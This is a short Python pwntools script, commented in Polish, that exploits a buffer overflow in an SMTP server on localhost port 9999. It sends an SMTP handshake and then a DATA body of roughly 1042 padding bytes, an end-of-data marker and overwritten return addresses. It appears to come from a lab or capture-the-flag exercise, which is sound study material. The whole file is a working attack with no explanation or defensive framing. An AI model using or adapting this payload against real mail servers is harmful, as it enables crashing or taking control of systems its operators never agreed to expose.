from pwn import *

pierwszy = 'A'*(1052-10) + '\r\n.\r\n' +'\xb8\xb8\xe1\x04\x08' + '\xb8\xe1\x04\x08'
"""przedostatni jest dlatego ze gdb mowil: cannot acces memory  (wiec dalem mu taka ktora moglby)"""

#attack
p = connect('localhost', 9999)
sleep(3)
p.sendline('HELO')
sleep(1)
p.sendline('MAIL FROM:<bill@localhost.com>')
sleep(1)
p.sendline('RCPT TO:<alice@localhost.com>')
sleep(1)
p.sendline('DATA')
sleep(2)
p.write(pierwszy)
sleep(30)
p.sendline('QUIT')
	
